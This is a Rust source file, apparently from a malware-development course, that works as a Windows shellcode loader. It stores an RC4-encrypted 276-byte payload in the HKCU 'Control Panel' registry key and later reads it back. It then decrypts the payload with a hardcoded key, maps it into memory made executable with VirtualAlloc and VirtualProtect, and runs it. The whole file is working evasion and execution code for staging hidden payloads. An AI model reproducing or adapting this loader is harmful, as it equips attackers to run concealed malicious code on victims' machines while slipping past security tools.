use std::ptr::{null, null_mut};
use windows_sys::{
    core::{s},
    Win32::{
        Foundation::{
            GetLastError,
            ERROR_SUCCESS
        }, 
        System::{
            Memory::{
                VirtualAlloc, 
                VirtualProtect, 
                MEM_COMMIT, 
                MEM_RESERVE, 
                PAGE_EXECUTE_READ, 
                PAGE_READWRITE
            }, 
            Registry::{
                RegCloseKey, 
                RegGetValueA, 
                RegOpenKeyExA, 
                RegSetValueExA, 
                HKEY_CURRENT_USER, 
                KEY_SET_VALUE, 
                REG_BINARY, 
                RRF_RT_ANY
            }
        }
    }
    };
use core::ffi::c_void;
use rc4::*;

#[cfg(feature = "readmode")]
fn read_registry() -> Vec<u8> {
    unsafe {
        let mut bytes_read = 0;
        let status = RegGetValueA(
            HKEY_CURRENT_USER, 
            s!("Control Panel"), 
            s!("MaldevAcademy"), 
            RRF_RT_ANY, 
            null_mut(),
            null_mut(),
            &mut bytes_read
        );
    
        if ERROR_SUCCESS != status {
            println!("[ ! ] RegGetValueA Failed with Error : {}", status);
            std::process::exit(0);
        }
        let p_bytes: Vec<u8> = vec![0;bytes_read as usize];

        let status = RegGetValueA(
            HKEY_CURRENT_USER, 
            s!("Control Panel"), 
            s!("MaldevAcademy"), 
            RRF_RT_ANY, 
            null_mut(), 
            p_bytes.as_ptr() as *mut c_void, 
            &mut bytes_read
        );
        if ERROR_SUCCESS != status {
            println!("[ ! ] RegGetValueA (second call) Failed With Error : {}", status);
            std::process::exit(0);
        }
        println!("[ + ] Shellcode read and allocated.");
        p_bytes
    }
}

#[cfg(feature = "writemode")]
fn write_registry() {
    unsafe {
        let buf : [u8; 276] = [
        0xC1, 0x58, 0x67, 0xB2, 0x5C, 0x58, 0x37, 0xBD, 0xAC, 0x25, 0xC1, 0x8A, 0xED, 0x47, 0x22,
        0xBA, 0xD9, 0x11, 0xE8, 0x24, 0x44, 0x69, 0x46, 0x4A, 0xC7, 0xD9, 0x32, 0x5F, 0xCE, 0xB3,
        0x28, 0xB3, 0x52, 0x5A, 0xB3, 0x37, 0x6E, 0xDA, 0x64, 0xFE, 0x36, 0x46, 0x04, 0x80, 0x35,
        0x15, 0x14, 0x1E, 0x67, 0xE7, 0x55, 0x9E, 0x75, 0xC1, 0x08, 0xEE, 0xF8, 0x63, 0xC3, 0x6E,
        0x80, 0x51, 0xB3, 0x20, 0x24, 0x69, 0x44, 0x30, 0xEF, 0xC7, 0x34, 0xDA, 0x52, 0x39, 0x91,
        0x80, 0xD3, 0x73, 0x53, 0x23, 0xD4, 0x7B, 0xD2, 0x2C, 0xAB, 0x4E, 0x58, 0xC6, 0xD4, 0xDD,
        0xE5, 0x20, 0x55, 0xE9, 0x95, 0x42, 0x25, 0x67, 0x67, 0xE2, 0x61, 0x3E, 0xE3, 0x1E, 0x0A,
        0x70, 0xF3, 0x36, 0xB4, 0xE9, 0x87, 0xA0, 0x5A, 0x3D, 0x21, 0xA1, 0x3E, 0x25, 0x20, 0x70,
        0xAD, 0xA4, 0xF8, 0x59, 0xAE, 0x99, 0x8B, 0xF4, 0xAA, 0xF4, 0xDD, 0xF7, 0x34, 0x51, 0x4B,
        0xF9, 0x11, 0xE8, 0x40, 0xD8, 0x66, 0x29, 0x38, 0x53, 0xFC, 0x74, 0xFE, 0x55, 0x50, 0x9B,
        0x29, 0x68, 0x6B, 0x7C, 0xB5, 0x8A, 0x75, 0xA0, 0x17, 0xB3, 0x65, 0xE3, 0xBF, 0x99, 0x5B,
        0x4D, 0xB7, 0x2A, 0x0A, 0x2B, 0xC2, 0xD7, 0xE9, 0x46, 0x31, 0xC8, 0xD7, 0x58, 0x09, 0xAD,
        0xE4, 0x8F, 0x72, 0x1B, 0x87, 0x29, 0xC1, 0x38, 0x1A, 0x03, 0xA7, 0x9F, 0x7E, 0x8B, 0x99,
        0xDF, 0x02, 0xCF, 0xB3, 0x10, 0x59, 0xD6, 0x26, 0x8D, 0x48, 0x8F, 0xC4, 0x55, 0x94, 0xA2,
        0xB7, 0x3F, 0xEA, 0xB4, 0xC8, 0xAA, 0x71, 0xDE, 0x8D, 0x71, 0xD5, 0x0C, 0xF4, 0x64, 0xD9,
        0x4C, 0xC4, 0x3B, 0x33, 0x0D, 0xB8, 0xA2, 0xA3, 0xD5, 0x46, 0xC9, 0x4D, 0x0F, 0x2C, 0xEB,
        0x80, 0x02, 0x44, 0x43, 0x90, 0x9C, 0x50, 0x6B, 0x21, 0xC2, 0x56, 0xC3, 0x4C, 0x11, 0xE4,
        0x69, 0x04, 0xFD, 0x06, 0xCF, 0xAF, 0x45, 0x72, 0xFF, 0xE7, 0x8F, 0xA3, 0x16, 0x06, 0x64,
        0xA8, 0x0B, 0xB7, 0x70, 0xF0, 0xB0
        ];

        let mut h_key = null_mut();

        let status = RegOpenKeyExA(
            HKEY_CURRENT_USER, 
            s!("Control Panel"), 
            0, 
            KEY_SET_VALUE, 
            &mut h_key
        );

        if ERROR_SUCCESS != status {
            println!("[ + ] RegOpenKeyExA Failed With Error : {}", status);
            std::process::exit(0);
        }

        let status = RegSetValueExA(
            h_key, 
            s!("MaldevAcademy"), 
            0, REG_BINARY, 
            buf.as_ptr(), 
            buf.len() as u32
        );

        if ERROR_SUCCESS != status {

            println!("[ + ] RegSetValueExA Failed With Error : {}", GetLastError());
            std::process::exit(0);
        }

        RegCloseKey(h_key);
        println!("[ + ] Writing {:p} of size {} to windows registry.", &buf, buf.len());
        println!("[ + ] Done!");

    }
    
}

fn main() {
    let key = [
        0x09, 0x01, 0x4A, 0x97, 0xE6, 0xD4, 0x8E, 0x94, 0xC9, 0xC3, 0xF0, 0x0B, 0x22, 0x97, 0x51, 0x41, 
        0x9E, 0x20, 0xC4, 0x54, 0x2F, 0xF7, 0x13, 0x13, 0x68, 0x7E, 0x44, 0xDB, 0x13, 0x13, 0x0C, 0x88
        ];

    #[cfg(feature = "writemode")]
    write_registry();

    #[cfg(feature = "readmode")]
        {
        let mut shellcode = read_registry();

        decryption(&mut shellcode, &key);

        unsafe {
            let address = VirtualAlloc(
                null(), 
                shellcode.len(), 
                MEM_COMMIT | MEM_RESERVE, 
                PAGE_READWRITE
            );

            std::ptr::copy_nonoverlapping(shellcode.as_ptr(), address.cast(), shellcode.len());

            let mut old_protection = 0;
            VirtualProtect(
                address, 
                shellcode.len(), 
                PAGE_EXECUTE_READ,
                &mut old_protection
            );

            let exec : extern "C" fn() = std::mem::transmute(address);

            exec();
        }
    }
}


fn decryption(shellcode : &mut Vec<u8>, key : &[u8;32]) {
    let mut rc4 = Rc4::new(key.into());
    rc4.apply_keystream(shellcode);
}